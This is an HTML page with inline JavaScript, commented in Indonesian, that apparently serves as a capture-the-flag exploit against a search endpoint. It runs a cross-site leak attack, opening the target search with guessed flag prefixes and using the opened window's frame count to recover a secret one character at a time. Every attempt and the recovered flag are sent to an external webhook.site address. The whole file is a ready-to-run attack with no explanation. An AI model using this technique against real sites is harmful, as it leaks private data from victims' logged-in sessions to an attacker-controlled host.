<!DOCTYPE html>
<html>
<body>
    <script>
        // Gunakan http:// untuk menghindari SSL Error Page pada Puppeteer
        const targetBase = "http://ponder.cbd2026.cloud/search?q=";
        const webhook = "https://webhook.site/76c1a3f4-7985-4c73-9f7d-1d28bae13e25"; 
        let flag = "flag{"; 
        const alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_}";

        fetch(`${webhook}?status=serangan_dimulai&target_mode=http`);

        async function tryChar(char) {
            return new Promise((resolve) => {
                const query = flag + char;
                const win = window.open(`${targetBase}${encodeURIComponent(query)}`);

                setTimeout(() => {
                    if (!win) {
                        fetch(`${webhook}?status=error_popup_blocked`);
                        resolve(false);
                        return;
                    }

                    const len = win.length;
                    win.close();
                    
                    // Log setiap percobaan agar kita tahu bot tidak macet
                    fetch(`${webhook}?char=${char}&len=${len}`);

                    // Cek jika len > 0 (mengantisipasi jika ada lebih dari 1 frame)
                    if (len > 0) {
                        resolve(true);
                    } else {
                        resolve(false);
                    }
                }, 2000); // Tunggu 2 detik agar halaman benar-benar dimuat
            });
        }

        async function start() {
            for (let char of alphabet) {
                if (await tryChar(char)) {
                    flag += char;
                    fetch(`${webhook}?PROGRESS=${encodeURIComponent(flag)}`);
                    if (char === "}") return;
                    return start(); 
                }
            }
            fetch(`${webhook}?status=gagal_menemukan_karakter_lanjutan`);
        }

        window.onload = start;
    </script>
</body>
</html>
